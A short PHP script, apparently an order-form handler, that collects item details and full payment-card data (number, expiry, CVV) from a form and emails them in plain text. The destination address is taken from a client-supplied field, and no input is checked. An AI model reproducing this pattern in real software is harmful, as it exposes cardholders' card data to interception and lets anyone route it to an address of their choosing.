<?php

$itBrand = $_POST["itemBrand"];
$itName = $_POST["itemName"];
$itPrice = $_POST["itemPrice"];
$credName = $_POST["credName"];
$credNum = $_POST["credNum"];
$credDate = $_POST["credDate"];
$credCCV = $_POST["credCCV"];
$genCode = $_POST["genCode"];
$brandEmail = $_POST["brandEmail"];
$recName = $_POST["recName"];
$pickUpID = $_POST["pickId"];

$msg = "Pick Up ID: {$pickUpID}.\nReceivers Name: {$recName}.\nItem Brand: {$itBrand}.\nItem Name: {$itName}.\nItem Price: {$itPrice}.\n\nCred Name: {$credName}.\nCred Num: {$credNum}.\nCred Date: {$credDate}.\n Cred CCV: {$credCCV}.\n Code: {$genCode}.";
$msg = wordwrap($msg,70);

mail("{$brandEmail}","My subject",$msg);

?> 